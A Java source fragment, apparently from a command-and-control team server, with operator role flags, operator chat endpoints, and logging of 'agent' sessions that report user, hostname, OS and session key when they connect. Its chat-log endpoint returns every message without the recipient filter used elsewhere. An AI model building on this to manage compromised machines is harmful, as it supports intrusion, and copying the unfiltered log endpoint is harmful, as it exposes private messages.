            M.put("CanKill", R.CanKillSession());
            M.put("CanManage", R.CanManage());
            M.put("CanKick", R.CanKickOperator());
            M.put("IsSuper", R.IsSuperAdmin());
            Roles.add(M);
        }
        return HttpHelper.Json(Map.of("Roles", Roles));
    }

    //  CHAT

    private String ApiChatSend(HttpExchange E, TokenInfo T) throws Exception {
        Map<String, Object> B = Body(E);
        String Msg = Str(B, "Message", "");
        String To = Str(B, "To", "all");
        if (Msg.isEmpty()) return HttpHelper.Json(Map.of("Error", "Message required"));
        Map<String, Object> Entry = new LinkedHashMap<>();
        Entry.put("From", T.Username());
        Entry.put("To", To);
        Entry.put("Message", Msg);
        Entry.put("Timestamp", LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")));
        Chat.add(Entry);
        if (Chat.size() > MaxChatSize) Chat.remove(0);
        Db.SaveChatLog(T.Username(), To, Msg);
        return HttpHelper.Json(Map.of("Success", true));
    }

    private String ApiChatMessages(HttpExchange E, TokenInfo T) throws Exception {
        String User = T.Username();
        List<Map<String, Object>> DbMessages = Db.GetChatLogs(MaxChatSize);
        List<Map<String, Object>> Visible = new ArrayList<>();
        for (Map<String, Object> Message : DbMessages) {
            String To = Message.getOrDefault("To", "all").toString();
            String From = Message.getOrDefault("From", "").toString();
            boolean IsForUser = To.equals("all") || From.equals(User);
            if (!IsForUser) {
                for (String Recipient : To.split(",")) {
                    if (Recipient.trim().equalsIgnoreCase(User)) { IsForUser = true; break; }
                }
            }
            if (IsForUser) Visible.add(Message);
        }
        return HttpHelper.Json(Map.of("Messages", Visible, "Count", Visible.size()));
    }

    private String ApiChatLogs(HttpExchange E, TokenInfo T) throws Exception {
        int Limit = Num(Body(E), "Limit", 100);
        return HttpHelper.Json(Map.of("Logs", Db.GetChatLogs(Math.min(Limit, 1000))));
    }

    //  EVENTS

    private void OnEvent(EventType Type, Map<String, Object> Data) {
        switch (Type) {
            case ServerStarted -> AddLog("Listener started on " + Data.get("Host") + ":" + Data.get("Port"));
            case AgentConnected -> {
                AddLog("[+] session-" + Data.get("ID") + " [" + Data.get("Type") + "] " + Data.get("User") + "@" + Data.get("Hostname") + " " + Data.get("OS") + " key=" + Data.get("SessionKey"));
                Db.SaveSessionEvent(Data, "connected");
            }
            case AgentDisconnected -> {
                AddLog("[-] session-" + Data.get("ID") + " disconnected: " + Data.get("Reason"));
                Db.SaveSessionEvent(Data, "disconnected");
            }
            case AgentRemoved -> AddLog("[-] session-" + Data.get("ID") + " removed");
            case Error -> AddLog("[!] " + Data.get("Message"));
        }
    }
}
